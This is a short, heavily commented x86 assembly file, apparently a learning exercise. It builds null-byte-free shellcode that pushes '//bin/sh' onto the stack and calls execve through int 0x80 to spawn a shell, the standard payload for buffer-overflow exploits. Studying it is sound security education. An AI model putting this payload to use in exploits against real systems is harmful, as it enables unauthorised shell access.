#code to open a linux shell
#can't put /bin/sh in the data section due to the null at the end
#so instead we put it on the stack, per rapidtables.com
#/bin/sh in hex is 2f 62 69 6e 2f 73 68, so we need to put that on the stack

.section .text
 .globl _start
_start:
	xor %eax, %eax		#this lets us set a register to $0 
				#without having a null byte in our code
	pushl %eax		#we need to push bytes onto the stack in reverse order
				#because it's a stack, this terminates our /bin/sh string
	pushl $0x68732f6e	#push "hs/n"
	pushl $0x69622f2f	#push "ib//" (extra / to avoid a null)

	movl %esp, %ebx		#put the location of our string into %ebx for the function call
	xor %ecx, %ecx		#%ecx is the arguments for /bin/sh, which should be null

	mov $0xb, %al		#move 11 into the bottom byte of %eax
				#movl $11, %eax would contain null bytes
	
	int $0x80

	mov $1, %al		#exit for debugging
	xor %ebx, %ebx		
	int $0x80
